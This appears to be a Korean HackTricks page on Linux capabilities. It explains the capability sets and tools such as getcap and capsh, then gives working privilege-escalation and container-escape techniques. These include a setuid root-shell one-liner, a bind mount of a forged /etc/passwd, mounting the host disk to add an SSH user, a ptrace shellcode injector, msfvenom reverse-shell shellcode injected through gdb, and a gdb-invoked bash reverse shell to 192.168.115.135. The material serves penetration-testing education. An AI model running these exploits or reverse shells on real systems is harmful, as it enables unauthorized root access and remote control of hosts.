# Linux Capabilities

{{#include ../../banners/hacktricks-training.md}}

Linux capabilities는 **root 권한을 더 작고 구분된 단위로 나누어**, 프로세스가 일부 권한만 보유할 수 있게 합니다. 불필요하게 전체 root 권한을 부여하지 않아 위험을 최소화합니다.<sup>[[3]](#references)[[4]](#references)[[5]](#references)[[14]](#references)</sup>

### 문제:

- 일반 사용자는 raw socket을 열거나 1024 미만의 Internet 포트에 바인딩하는 등의 작업을 할 때 권한이 제한됩니다. capabilities를 사용하면 전체 root 권한 대신 필요한 작업에만 권한을 부여할 수 있습니다.<sup>[[14]](#references)</sup>

### Capability Set:

Linux는 스레드별로 다음 capability set을 제공하며, 프로세스가 자격 증명을 변경하거나 파일을 실행할 때 커널이 해당 제약을 적용합니다.<sup>[[14]](#references)</sup>

1. **Inherited (CapInh)**:

   - **목적**: 실행된 파일에 일치하는 inheritable file capabilities가 있을 때, `execve()` 이후 permitted set에 포함될 수 있는 capabilities를 나타냅니다.
   - **기능**: 스레드의 inheritable set은 `execve()` 이후에도 유지되지만, 이 set만으로는 해당 capabilities가 effective 상태가 되지 않습니다.
   - **제한 사항**: 이 set에 capability를 추가하는 작업은 permitted set과 bounding set의 제약을 받습니다.<sup>[[14]](#references)</sup>

2. **Effective (CapEff)**:

   - **목적**: 프로세스가 특정 시점에 실제로 사용 중인 capabilities를 나타냅니다.
   - **기능**: 다양한 작업에 대한 권한을 부여하기 위해 커널이 확인하는 capabilities의 집합입니다. 파일의 경우, 이 set은 파일의 permitted capabilities를 effective 상태로 간주할지 나타내는 플래그일 수 있습니다.
   - **중요성**: effective set은 즉각적인 권한 검사를 수행하는 데 핵심적이며, 프로세스가 사용할 수 있는 활성 capabilities 집합으로 작동합니다.

3. **Permitted (CapPrm)**:

   - **목적**: 프로세스가 보유할 수 있는 capabilities의 최대 집합을 정의합니다.
   - **기능**: 프로세스는 permitted set의 capability를 effective set으로 올려 해당 capability를 사용할 수 있습니다. permitted set에서 capabilities를 제거할 수도 있습니다.
   - **경계**: 이 set에서 capability를 제거하면, 해당 capability를 부여하는 파일을 실행하거나 다른 privileged transition을 거치지 않는 한 일반적으로 복원할 수 없습니다.<sup>[[14]](#references)</sup>

4. **Bounding (CapBnd)**:

   - **목적**: `execve()` 중에 파일로부터 프로세스가 얻을 수 있는 capabilities와 inheritable set에 추가할 수 있는 capabilities를 제한합니다.
   - **기능**: 이 set은 `fork()` 이후에도 상속되고 `execve()` 이후에도 유지됩니다. 호출자에게 `CAP_SETPCAP`이 있으면 여기서 capabilities를 제거할 수 있습니다.
   - **사용 사례**: 이 set에서 불필요한 capabilities를 제거하면 이후 권한 획득을 제한할 수 있습니다.<sup>[[14]](#references)</sup>

5. **Ambient (CapAmb)**:
   - **목적**: 권한이 없는 프로그램을 `execve()`한 뒤에도 선택한 capabilities가 permitted 및 effective 상태를 유지하도록 합니다.
   - **기능**: 실행된 파일에 특권이 없으면 ambient capabilities가 새 permitted 및 effective set에 추가됩니다.
   - **제한 사항**: capability는 permitted set과 inheritable set 양쪽에 모두 존재할 때만 ambient 상태가 될 수 있습니다. set-user-ID/set-group-ID 파일이나 capabilities가 설정된 파일을 실행하면 ambient set이 초기화됩니다.<sup>[[8]](#references)[[9]](#references)[[14]](#references)</sup>

## 프로세스 및 바이너리의 Capabilities

### 프로세스 Capabilities

특정 프로세스의 capabilities를 확인하려면 /proc 디렉터리의 **status** 파일을 사용합니다. 더 자세한 정보가 제공되므로 Linux capabilities와 관련된 정보만 확인해 보겠습니다.\
실행 중인 모든 프로세스의 capability 정보는 스레드별로 관리되는 반면, file capabilities는 `security.capability` 확장 속성에 저장됩니다.<sup>[[14]](#references)[[15]](#references)</sup>

capabilities는 /usr/include/linux/capability.h에서 확인할 수 있습니다.

현재 프로세스의 capabilities는 `cat /proc/self/status` 또는 `capsh --print`로 확인할 수 있으며, 다른 프로세스의 capabilities는 `/proc/<pid>/status`에서 확인할 수 있습니다.<sup>[[15]](#references)[[26]](#references)</sup>

```bash
cat /proc/1234/status | grep Cap
cat /proc/$$/status | grep Cap #This will print the capabilities of the current process
```

대부분의 시스템에서 이 명령은 capability 항목을 다섯 줄 반환해야 합니다.<sup>[[15]](#references)</sup>

- CapInh = 상속된 capabilities
- CapPrm = 허용된 capabilities
- CapEff = 유효한 capabilities
- CapBnd = 제한 집합
- CapAmb = Ambient capabilities 집합

```bash
#These are the typical capabilities of a root owned process (all)
CapInh: 0000000000000000
CapPrm: 0000003fffffffff
CapEff: 0000003fffffffff
CapBnd: 0000003fffffffff
CapAmb: 0000000000000000
```

이 16진수 숫자는 의미를 알기 어렵습니다. `capsh` 유틸리티를 사용하면 이를 capability 이름으로 디코딩할 수 있습니다.<sup>[[26]](#references)</sup>

```bash
capsh --decode=0000003fffffffff
0x0000003fffffffff=cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_linux_immutable,cap_net_bind_service,cap_net_broadcast,cap_net_admin,cap_net_raw,cap_ipc_lock,cap_ipc_owner,cap_sys_module,cap_sys_rawio,cap_sys_chroot,cap_sys_ptrace,cap_sys_pacct,cap_sys_admin,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,cap_setfcap,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,37
```

이제 `ping`에서 사용하는 **capabilities**를 확인해 보겠습니다:

```bash
cat /proc/9491/status | grep Cap
CapInh:    0000000000000000
CapPrm:    0000000000003000
CapEff:    0000000000000000
CapBnd:    0000003fffffffff
CapAmb:    0000000000000000

capsh --decode=0000000000003000
0x0000000000003000=cap_net_admin,cap_net_raw
```

작동하긴 하지만, 더 쉽고 간단한 방법도 있습니다. 실행 중인 프로세스의 capabilities를 확인하려면 **getpcaps** 도구 뒤에 프로세스 ID(PID)를 입력하세요. 프로세스 ID 목록도 입력할 수 있습니다.<sup>[[22]](#references)</sup>

```bash
getpcaps 1234
```

`cap_net_admin` 및 `cap_net_raw`를 바이너리에 부여한 후, 네트워크를 sniff하기 위해 `tcpdump`의 capabilities를 확인해 봅시다(`tcpdump`는 프로세스 9562에서 실행 중입니다).<sup>[[22]](#references)[[25]](#references)</sup>

```bash
#The following command give tcpdump the needed capabilities to sniff traffic
$ setcap cap_net_raw,cap_net_admin=eip /usr/sbin/tcpdump

$ getpcaps 9562
Capabilities for `9562': = cap_net_admin,cap_net_raw+ep

$ cat /proc/9562/status | grep Cap
CapInh:    0000000000000000
CapPrm:    0000000000003000
CapEff:    0000000000003000
CapBnd:    0000003fffffffff
CapAmb:    0000000000000000

$ capsh --decode=0000000000003000
0x0000000000003000=cap_net_admin,cap_net_raw
```

보시다시피 capabilities는 프로세스를 검사하는 두 가지 방법의 결과와 일치합니다. `getpcaps` 도구는 libcap을 사용해 대상 프로세스의 capabilities를 조회하고 텍스트 형식으로 출력합니다. PID는 하나 이상 지정할 수 있습니다.<sup>[[22]](#references)</sup>

### 바이너리 capabilities

바이너리에는 실행 중 적용되는 file capabilities가 설정될 수 있습니다. 예를 들어 `ping` 바이너리에는 `cap_net_raw` capability가 설정될 수 있습니다.<sup>[[14]](#references)</sup>

```bash
getcap /usr/bin/ping
/usr/bin/ping = cap_net_raw+ep
```

capabilities가 설정된 **바이너리는** `getcap -r`로 검색할 수 있습니다.<sup>[[23]](#references)</sup>

```bash
getcap -r / 2>/dev/null
```

### capsh로 capabilities 제거하기

기존 bounding set에서 `CAP_NET_RAW`를 제거하면 해당 capability가 필요한 프로그램은 더 이상 이를 사용할 수 없습니다.<sup>[[26]](#references)</sup>

```bash
capsh --drop=cap_net_raw --print -- -c "tcpdump"
```

_capsh_ 자체의 출력 외에도 _tcpdump_ 명령 자체에서 오류가 발생해야 합니다.

> /bin/bash: /usr/sbin/tcpdump: Operation not permitted

이 오류는 `CAP_NET_RAW`가 bounding set에서 제거된 후 `tcpdump`가 요청된 file capability로 실행될 수 없음을 보여 줍니다.

### Capabilities 제거

`setcap -r`을 사용하면 파일의 capabilities를 제거할 수 있습니다.<sup>[[25]](#references)</sup>

```bash
setcap -r </path/to/binary>
```

## 사용자 Capabilities

Linux는 로그인 사용자에게 파일 capabilities를 직접 할당하지 않지만, `pam_cap` PAM 모듈은 `/etc/security/capability.conf`를 사용해 인증된 세션에 상속 가능한 capabilities를 설정할 수 있습니다.<sup>[[16]](#references)</sup> 각 항목은 쉼표로 구분된 capability 이름이나 번호를 하나 이상의 사용자 이름에 매핑합니다.<sup>[[17]](#references)</sup>
파일 예시:

```bash
# Simple
cap_sys_ptrace               developer
cap_net_raw                  user1

# Multiple capablities
cap_net_admin,cap_net_raw    jrnetadmin
# Identical, but with numeric values
12,13                        jrnetadmin

# Combining names and numerics
cap_sys_admin,22,25          jrsysadmin
```

## 환경 Capabilities

다음 프로그램을 컴파일하면 **capabilities를 제공하는 환경 내에서 bash 셸을 생성**할 수 있습니다.<sup>[[14]](#references)</sup>

```c:ambient.c
/*
 * Test program for the ambient capabilities
 *
 * compile using:
 * gcc -Wl,--no-as-needed -lcap-ng -o ambient ambient.c
 * Set effective, inherited and permitted capabilities to the compiled binary
 * sudo setcap cap_setpcap,cap_net_raw,cap_net_admin,cap_sys_nice+eip ambient
 *
 * To get a shell with additional caps that can be inherited do:
 *
 * ./ambient /bin/bash
 */

#include <stdlib.h>
#include <stdio.h>
#include <string.h>
#include <errno.h>
#include <sys/prctl.h>
#include <linux/capability.h>
#include <cap-ng.h>

static void set_ambient_cap(int cap) {
  int rc;
  capng_get_caps_process();
  rc = capng_update(CAPNG_ADD, CAPNG_INHERITABLE, cap);
  if (rc) {
    printf("Cannot add inheritable cap\n");
    exit(2);
  }
  capng_apply(CAPNG_SELECT_CAPS);
  /* Note the two 0s at the end. Kernel checks for these */
  if (prctl(PR_CAP_AMBIENT, PR_CAP_AMBIENT_RAISE, cap, 0, 0)) {
    perror("Cannot set cap");
    exit(1);
  }
}
void usage(const char * me) {
  printf("Usage: %s [-c caps] new-program new-args\n", me);
  exit(1);
}
int default_caplist[] = {
  CAP_NET_RAW,
  CAP_NET_ADMIN,
  CAP_SYS_NICE,
  -1
};
int * get_caplist(const char * arg) {
  int i = 1;
  int * list = NULL;
  char * dup = strdup(arg), * tok;
  for (tok = strtok(dup, ","); tok; tok = strtok(NULL, ",")) {
    list = realloc(list, (i + 1) * sizeof(int));
    if (!list) {
      perror("out of memory");
      exit(1);
    }
    list[i - 1] = atoi(tok);
    list[i] = -1;
    i++;
  }
  return list;
}
int main(int argc, char ** argv) {
  int rc, i, gotcaps = 0;
  int * caplist = NULL;
  int index = 1; // argv index for cmd to start
  if (argc < 2)
    usage(argv[0]);
  if (strcmp(argv[1], "-c") == 0) {
    if (argc <= 3) {
      usage(argv[0]);
    }
    caplist = get_caplist(argv[2]);
    index = 3;
  }
  if (!caplist) {
    caplist = (int * ) default_caplist;
  }
  for (i = 0; caplist[i] != -1; i++) {
    printf("adding %d to ambient list\n", caplist[i]);
    set_ambient_cap(caplist[i]);
  }
  printf("Ambient forking shell\n");
  if (execv(argv[index], argv + index))
    perror("Cannot exec");
  return 0;
}
```

```bash
gcc -Wl,--no-as-needed -lcap-ng -o ambient ambient.c
sudo setcap cap_setpcap,cap_net_raw,cap_net_admin,cap_sys_nice+eip ambient
./ambient /bin/bash
```

**컴파일된 ambient 바이너리가 실행한 bash 내부**에서 **새 capabilities**를 확인할 수 있습니다(일반 사용자는 "current" 섹션에 capability가 없습니다).<sup>[[14]](#references)</sup>

```bash
capsh --print
Current: = cap_net_admin,cap_net_raw,cap_sys_nice+eip
```

> [!CAUTION]
> 허용 집합과 상속 가능 집합에 모두 포함된 capabilities만 추가할 수 있습니다.<sup>[[14]](#references)</sup>

### Capability-aware/Capability-dumb 바이너리

Capability-dumb 바이너리는 파일 capabilities가 있지만 이를 관리하는 데 libcap을 사용하지 않는 프로그램입니다. 파일의 effective 비트가 설정되어 있으면 커널은 파일의 허용된 capabilities를 프로세스의 effective 집합에 활성화합니다. 프로세스가 허용된 capabilities를 모두 획득하지 못한 경우 실행이 실패할 수 있습니다.<sup>[[14]](#references)</sup>

## 서비스 capabilities

root로 실행되는 시스템 서비스는 실행 환경에서 제한하지 않는 한 광범위한 capabilities를 유지할 수 있습니다. systemd 유닛에서 `User=`는 서비스 사용자를 지정하고, `AmbientCapabilities=`는 실행되는 프로세스의 ambient 집합에 지정된 capabilities를 추가합니다.<sup>[[18]](#references)</sup>

```bash
[Service]
User=bob
AmbientCapabilities=CAP_NET_BIND_SERVICE
```

## Docker 컨테이너의 Capabilities

Docker는 기본 capability 집합으로 컨테이너를 시작하며, `--cap-add` 및 `--cap-drop`으로 이를 변경할 수 있습니다. 예시 컨테이너는 `amicontained`로 검사할 수 있습니다.<sup>[[19]](#references)[[24]](#references)</sup>

```bash
docker run --rm -it  r.j3ss.co/amicontained bash
Capabilities:
	BOUNDING -> chown dac_override fowner fsetid kill setgid setuid setpcap net_bind_service net_raw sys_chroot mknod audit_write setfcap

# Add a capabilities
docker run --rm -it --cap-add=SYS_ADMIN r.j3ss.co/amicontained bash

# Add all capabilities
docker run --rm -it --cap-add=ALL r.j3ss.co/amicontained bash

# Remove all and add only one
docker run --rm -it  --cap-drop=ALL --cap-add=SYS_PTRACE r.j3ss.co/amicontained bash
```

## Privesc/Container Escape

Capabilities는 권한이 필요한 작업을 수행한 후 자체 프로세스를 제한하려는 경우(예: chroot를 설정하고 소켓에 바인딩한 후) 유용합니다. 하지만 악의적인 명령이나 인수를 전달하면 이를 악용할 수 있으며, 해당 명령이나 인수는 root 권한으로 실행됩니다.<sup>[[2]](#references)</sup>

`setcap`으로 프로그램에 file capabilities를 설정하고, `getcap`으로 이를 조회할 수 있습니다.<sup>[[23]](#references)[[25]](#references)</sup>

```bash
#Set Capability
setcap cap_net_raw+ep /sbin/ping

#Get Capability
getcap /sbin/ping
/sbin/ping = cap_net_raw+ep
```

파일 capability 텍스트에서 `+ep`는 지정된 capability를 effective 및 permitted 집합에 추가하고, `-`는 선택한 플래그를 제거합니다.<sup>[[21]](#references)</sup>

시스템이나 폴더에서 capability가 설정된 프로그램을 찾으려면 `getcap -r`을 사용합니다.<sup>[[23]](#references)</sup>

```bash
getcap -r / 2>/dev/null
```

### Exploitation 예시

다음 예시에서는 바이너리 `/usr/bin/python2.6`이 privesc에 취약한 것으로 확인됩니다:

```bash
setcap cap_setuid+ep /usr/bin/python2.7
/usr/bin/python2.7 = cap_setuid+ep

#Exploit
/usr/bin/python2.7 -c 'import os; os.setuid(0); os.system("/bin/bash");'
```

`tcpdump`가 **모든 사용자가 패킷을 스니핑할 수 있도록** 하는 데 필요한 **Capabilities**:

```bash
setcap cap_net_raw,cap_net_admin=eip /usr/sbin/tcpdump
getcap /usr/sbin/tcpdump
/usr/sbin/tcpdump = cap_net_admin,cap_net_raw+eip
```

### 생략된 capability 이름의 특수 사례

libcap의 텍스트 형식에서 `getcap myelf`가 `myelf =ep`를 보고하면, 실행 프로세스의 bounding set, user namespace 및 기타 실행 제한이 허용하는 범위에서 **모든 capabilities**가 effective 및 permitted로 표시된다는 뜻입니다. 빈 file capability set은 `myelf =`(`e` 또는 `p` 없음)이며, capability attribute가 없는 파일과는 다릅니다. `=ep` 파일 자체가 프로세스 UID를 root로 변경하지는 않지만, `CAP_DAC_READ_SEARCH` 또는 `CAP_DAC_OVERRIDE`를 사용할 수 있는 프로그램은 Unix UID로는 읽을 수 없는 파일을 읽을 수 있습니다. 해당 프로그램의 입력 옵션을 privileged file-read 경로로 간주하기 전에 실제 executable의 file mode, namespace 및 effective capabilities를 확인하세요. libcap의 [capability 텍스트 형식](https://man7.org/linux/man-pages/man7/cap_text_formats.7.html)과 [빈 값 동작](https://man7.org/linux/man-pages/man8/getcap.8.html)을 참고하세요.<sup>[[14]](#references)</sup>

## CAP_SYS_ADMIN

**[`CAP_SYS_ADMIN`](https://man7.org/linux/man-pages/man7/capabilities.7.html)**은 강력한 Linux capability로, 장치 마운트나 커널 기능 조작과 같은 광범위한 **관리 권한** 때문에 root에 가까운 수준으로 여겨지는 경우가 많습니다. 전체 시스템을 시뮬레이션하는 컨테이너에는 필수적이지만, **`CAP_SYS_ADMIN`은 권한 상승과 시스템 침해 가능성 때문에** 특히 컨테이너 환경에서 심각한 보안 문제를 야기합니다. 따라서 이 capability의 사용은 엄격한 보안 평가와 신중한 관리가 필요하며, attack surface를 최소화하고 **최소 권한 원칙**을 준수하려면 애플리케이션 전용 컨테이너에서 이 capability를 제거하는 것을 우선해야 합니다.<sup>[[14]](#references)</sup>

namespace 전환에서는 적용 범위가 중요합니다. `setns()`는 대상 namespace를 소유한 user namespace를 기준으로 `CAP_SYS_ADMIN`을 확인합니다. mount namespace에 진입하려면 호출자의 user namespace에서 `CAP_SYS_CHROOT`도 필요합니다. 비공개 remapped user namespace 내에서만 보유한 capability로는 initial host namespace에 임의로 진입할 수 없습니다.<sup>[[14]](#references)</sup>

**바이너리 예시**

```bash
getcap -r / 2>/dev/null
/usr/bin/python2.7 = cap_sys_admin+ep
```

Python을 사용하면 수정된 _passwd_ 파일을 실제 _passwd_ 파일 위에 마운트할 수 있습니다:

```bash
cp /etc/passwd ./ #Create a copy of the passwd file
openssl passwd -1 -salt abc password #Get hash of "password"
vim ./passwd #Change roots passwords of the fake passwd file
```

그리고 마지막으로 수정된 `passwd` 파일을 `/etc/passwd`에 **mount**합니다:

```python
from ctypes import *
libc = CDLL("libc.so.6")
libc.mount.argtypes = (c_char_p, c_char_p, c_char_p, c_ulong, c_char_p)
MS_BIND = 4096
source = b"/path/to/fake/passwd"
target = b"/etc/passwd"
filesystemtype = b"none"
options = b"rw"
mountflags = MS_BIND
libc.mount(source, target, filesystemtype, mountflags, options)
```

그리고 password "password"를 사용해 **root로 `su`**할 수 있습니다.

**환경을 사용한 예 (Docker breakout)**

다음 명령어를 사용해 docker container 내부에서 활성화된 capabilities를 확인할 수 있습니다:

```
capsh --print
Current: = cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_linux_immutable,cap_net_bind_service,cap_net_broadcast,cap_net_admin,cap_net_raw,cap_ipc_lock,cap_ipc_owner,cap_sys_module,cap_sys_rawio,cap_sys_chroot,cap_sys_ptrace,cap_sys_pacct,cap_sys_admin,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,cap_setfcap,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,cap_audit_read+ep
Bounding set =cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_linux_immutable,cap_net_bind_service,cap_net_broadcast,cap_net_admin,cap_net_raw,cap_ipc_lock,cap_ipc_owner,cap_sys_module,cap_sys_rawio,cap_sys_chroot,cap_sys_ptrace,cap_sys_pacct,cap_sys_admin,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,cap_setfcap,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,cap_audit_read
Securebits: 00/0x0/1'b0
 secure-noroot: no (unlocked)
 secure-no-suid-fixup: no (unlocked)
 secure-keep-caps: no (unlocked)
uid=0(root)
gid=0(root)
groups=0(root)
```

이전 출력에서 SYS_ADMIN capability가 활성화된 것을 확인할 수 있습니다.<sup>[[14]](#references)</sup>

- **Mount**

적절한 device 및 namespace 접근 권한이 있으면 Docker 컨테이너에서 **호스트 디스크를 mount하고 그 내용을 확인**할 수 있습니다. device node는 실제 호스트 device를 나타내야 하고, device cgroup에서 해당 접근을 허용해야 합니다. 블록 기반 파일시스템을 mount하려면 초기 user namespace에서 `CAP_SYS_ADMIN`이 필요합니다.<sup>[[14]](#references)</sup>

```bash
lsblk -o NAME,PATH,TYPE,SIZE,FSTYPE,MOUNTPOINTS
node_root_device=/dev/sda1 # Replace with the validated filesystem partition or LV.
mkdir -p /mnt/host
mount -o ro "${node_root_device}" /mnt/host
cat /mnt/host/etc/hostname
umount /mnt/host
```

- **전체 액세스**

이전 방법에서는 호스트 디스크에 액세스할 수 있었습니다.\
호스트에서 **ssh** 서버를 실행 중이라면, **마운트된 디스크에 사용자를 생성한 뒤** SSH를 통해 액세스할 수 있습니다.<sup>[[14]](#references)</sup>

```bash
#Like in the example before, the first step is to mount the docker host disk
node_root_device=/dev/sda1
mount "${node_root_device}" /mnt/host

#Then, search for open ports inside the docker host
nc -v -n -w2 -z 172.17.0.1 1-65535
(UNKNOWN) [172.17.0.1] 2222 (?) open

#Finally, create a new user inside the docker host and use it to access via SSH
chroot /mnt/host adduser john
ssh john@172.17.0.1 -p 2222
```

`/mnt/host`에서 직접 읽고 쓰는 것만으로 이미 host 파일 시스템에 접근할 수 있습니다. 마지막 `chroot`는 경로를 편리하게 다루기 위한 것일 뿐이며, 추가로 `CAP_SYS_CHROOT`가 필요합니다. 탈출을 가능하게 하는 단계는 아닙니다.

## CAP_SYS_PTRACE

`CAP_SYS_PTRACE`가 있으면 프로세스는 자신의 PID namespace에서 볼 수 있는 다른 프로세스를 추적하고 검사할 수 있습니다. Docker 컨테이너에서 host 프로세스를 대상으로 하려면 `--pid=host`로 host PID namespace를 공유하거나, 대상이 포함된 namespace에 참여해야 합니다.<sup>[[14]](#references)[[20]](#references)</sup>

**[`CAP_SYS_PTRACE`](https://man7.org/linux/man-pages/man7/capabilities.7.html)**는 `ptrace(2)`와 `process_vm_readv(2)`, `process_vm_writev(2)` 같은 cross-memory attach 호출이 제공하는 디버깅 및 시스템 호출 추적 기능을 사용할 수 있게 합니다. 진단 및 모니터링 목적으로 유용하지만, `ptrace(2)`에 대한 seccomp filter 같은 제한 조치 없이 `CAP_SYS_PTRACE`가 활성화되어 있으면 시스템 보안을 크게 약화시킬 수 있습니다. 특히, [이 PoC와 같은 proof of concept](https://gist.github.com/thejh/8346f47e359adecd1d53)에서 보여주듯, seccomp가 적용한 제한을 비롯한 다른 보안 제한을 우회하는 데 악용될 수 있습니다.<sup>[[10]](#references)</sup>

**binary 예시 (python)**

```bash
getcap -r / 2>/dev/null
/usr/bin/python2.7 = cap_sys_ptrace+ep
```

```python
import ctypes
import sys
import struct
# Macros defined in <sys/ptrace.h>
# https://code.woboq.org/qt5/include/sys/ptrace.h.html
PTRACE_POKETEXT = 4
PTRACE_GETREGS = 12
PTRACE_SETREGS = 13
PTRACE_ATTACH = 16
PTRACE_DETACH = 17
# Structure defined in <sys/user.h>
# https://code.woboq.org/qt5/include/sys/user.h.html#user_regs_struct
class user_regs_struct(ctypes.Structure):
    _fields_ = [
        ("r15", ctypes.c_ulonglong),
        ("r14", ctypes.c_ulonglong),
        ("r13", ctypes.c_ulonglong),
        ("r12", ctypes.c_ulonglong),
        ("rbp", ctypes.c_ulonglong),
        ("rbx", ctypes.c_ulonglong),
        ("r11", ctypes.c_ulonglong),
        ("r10", ctypes.c_ulonglong),
        ("r9", ctypes.c_ulonglong),
        ("r8", ctypes.c_ulonglong),
        ("rax", ctypes.c_ulonglong),
        ("rcx", ctypes.c_ulonglong),
        ("rdx", ctypes.c_ulonglong),
        ("rsi", ctypes.c_ulonglong),
        ("rdi", ctypes.c_ulonglong),
        ("orig_rax", ctypes.c_ulonglong),
        ("rip", ctypes.c_ulonglong),
        ("cs", ctypes.c_ulonglong),
        ("eflags", ctypes.c_ulonglong),
        ("rsp", ctypes.c_ulonglong),
        ("ss", ctypes.c_ulonglong),
        ("fs_base", ctypes.c_ulonglong),
        ("gs_base", ctypes.c_ulonglong),
        ("ds", ctypes.c_ulonglong),
        ("es", ctypes.c_ulonglong),
        ("fs", ctypes.c_ulonglong),
        ("gs", ctypes.c_ulonglong),
    ]

libc = ctypes.CDLL("libc.so.6")

pid=int(sys.argv[1])

# Define argument type and respone type.
libc.ptrace.argtypes = [ctypes.c_uint64, ctypes.c_uint64, ctypes.c_void_p, ctypes.c_void_p]
libc.ptrace.restype = ctypes.c_uint64

# Attach to the process
libc.ptrace(PTRACE_ATTACH, pid, None, None)
registers=user_regs_struct()

# Retrieve the value stored in registers
libc.ptrace(PTRACE_GETREGS, pid, None, ctypes.byref(registers))
print("Instruction Pointer: " + hex(registers.rip))
print("Injecting Shellcode at: " + hex(registers.rip))

# Shell code copied from exploit db. https://github.com/0x00pf/0x00sec_code/blob/master/mem_inject/infect.c
shellcode = "\x48\x31\xc0\x48\x31\xd2\x48\x31\xf6\xff\xc6\x6a\x29\x58\x6a\x02\x5f\x0f\x05\x48\x97\x6a\x02\x66\xc7\x44\x24\x02\x15\xe0\x54\x5e\x52\x6a\x31\x58\x6a\x10\x5a\x0f\x05\x5e\x6a\x32\x58\x0f\x05\x6a\x2b\x58\x0f\x05\x48\x97\x6a\x03\x5e\xff\xce\xb0\x21\x0f\x05\x75\xf8\xf7\xe6\x52\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x48\x8d\x3c\x24\xb0\x3b\x0f\x05"

# Inject the shellcode into the running process byte by byte.
for i in xrange(0,len(shellcode),4):
    # Convert the byte to little endian.
    shellcode_byte_int=int(shellcode[i:4+i].encode('hex'),16)
    shellcode_byte_little_endian=struct.pack("<I", shellcode_byte_int).rstrip('\x00').encode('hex')
    shellcode_byte=int(shellcode_byte_little_endian,16)

    # Inject the byte.
    libc.ptrace(PTRACE_POKETEXT, pid, ctypes.c_void_p(registers.rip+i),shellcode_byte)

print("Shellcode Injected!!")

# Modify the instuction pointer
registers.rip=registers.rip+2

# Set the registers
libc.ptrace(PTRACE_SETREGS, pid, None, ctypes.byref(registers))
print("Final Instruction Pointer: " + hex(registers.rip))

# Detach from the process.
libc.ptrace(PTRACE_DETACH, pid, None, None)
```

**binary 예제 (gdb)**

`gdb`에 `ptrace` capability가 있는 경우:

```
/usr/bin/gdb = cap_sys_ptrace+ep
```

디버거의 capability는 검토를 위한 단서일 뿐입니다. 현재 프로세스가 해당 파일을 실행할 수 있는지(그룹 및 ACL 권한 포함), 실행 후 `CAP_SYS_PTRACE`가 유효한지, 더 높은 권한의 대상 프로세스가 동일한 PID namespace에서 보이고 attach 가능한지 확인하세요. `no_new_privs`, `nosuid` 마운트, capability bounding set, Yama, seccomp 또는 LSM에 따라 결과가 달라질 수 있습니다. [`capabilities(7)`](https://man7.org/linux/man-pages/man7/capabilities.7.html) 및 [커널의 Yama 문서](https://docs.kernel.org/admin-guide/LSM/Yama.html)를 참조하세요. 대상 프로세스에 attach하지 말고 파일 및 프로세스 메타데이터를 열거하세요.

gdb를 통해 메모리에 주입할 shellcode를 msfvenom으로 생성하세요

```python
# msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.14.11 LPORT=9001 -f py -o revshell.py
buf =  b""
buf += b"\x6a\x29\x58\x99\x6a\x02\x5f\x6a\x01\x5e\x0f\x05"
buf += b"\x48\x97\x48\xb9\x02\x00\x23\x29\x0a\x0a\x0e\x0b"
buf += b"\x51\x48\x89\xe6\x6a\x10\x5a\x6a\x2a\x58\x0f\x05"
buf += b"\x6a\x03\x5e\x48\xff\xce\x6a\x21\x58\x0f\x05\x75"
buf += b"\xf6\x6a\x3b\x58\x99\x48\xbb\x2f\x62\x69\x6e\x2f"
buf += b"\x73\x68\x00\x53\x48\x89\xe7\x52\x57\x48\x89\xe6"
buf += b"\x0f\x05"

# Divisible by 8
payload = b"\x90" * (-len(buf) % 8) + buf

# Change endianess and print gdb lines to load the shellcode in RIP directly
for i in range(0, len(buf), 8):
	chunk = payload[i:i+8][::-1]
	chunks = "0x"
	for byte in chunk:
		chunks += f"{byte:02x}"

	print(f"set {{long}}($rip+{i}) = {chunks}")
```

gdb로 root 프로세스를 디버깅하고 이전에 생성한 gdb 명령어를 복사해 붙여넣습니다:

```bash
# Let's write the commands to a file
echo 'set {long}($rip+0) = 0x296a909090909090
set {long}($rip+8) = 0x5e016a5f026a9958
set {long}($rip+16) = 0x0002b9489748050f
set {long}($rip+24) = 0x48510b0e0a0a2923
set {long}($rip+32) = 0x582a6a5a106ae689
set {long}($rip+40) = 0xceff485e036a050f
set {long}($rip+48) = 0x6af675050f58216a
set {long}($rip+56) = 0x69622fbb4899583b
set {long}($rip+64) = 0x8948530068732f6e
set {long}($rip+72) = 0x050fe689485752e7
c' > commands.gdb
# In this case there was a sleep run by root
## NOTE that the process you abuse will die after the shellcode
/usr/bin/gdb -p $(pgrep sleep)
[...]
(gdb) source commands.gdb
Continuing.
process 207009 is executing new program: /usr/bin/dash
[...]
```

**환경 예시 (Docker breakout) - 또 다른 gdb 악용**

**GDB**가 설치되어 있으면(또는 예를 들어 `apk add gdb`나 `apt install gdb`로 설치할 수 있으면), **확인 가능한 호스트 프로세스를 디버깅**하여 `system` 함수를 호출하게 할 수 있습니다. 이를 위해 대상의 사용자 네임스페이스에서 유효한 `CAP_SYS_PTRACE` 권한과 호스트 PID 가시성이 필요하며, `CAP_SYS_ADMIN`은 필요하지 않습니다. Yama, non-dumpable 상태, seccomp, LSM 정책은 여전히 attach를 차단할 수 있습니다.

```bash
gdb -p 1234
(gdb) call (void)system("ls")
(gdb) call (void)system("sleep 5")
(gdb) call (void)system("bash -c 'bash -i >& /dev/tcp/192.168.115.135/5656 0>&1'")
```

명령의 출력은 볼 수 없지만, 해당 프로세스가 명령을 실행하므로 rev shell을 얻을 수 있습니다.

> [!WARNING]
> "No symbol "system" in current context." 오류가 발생하면 gdb를 통해 프로그램에 shellcode를 로드하는 이전 예제를 확인하세요.

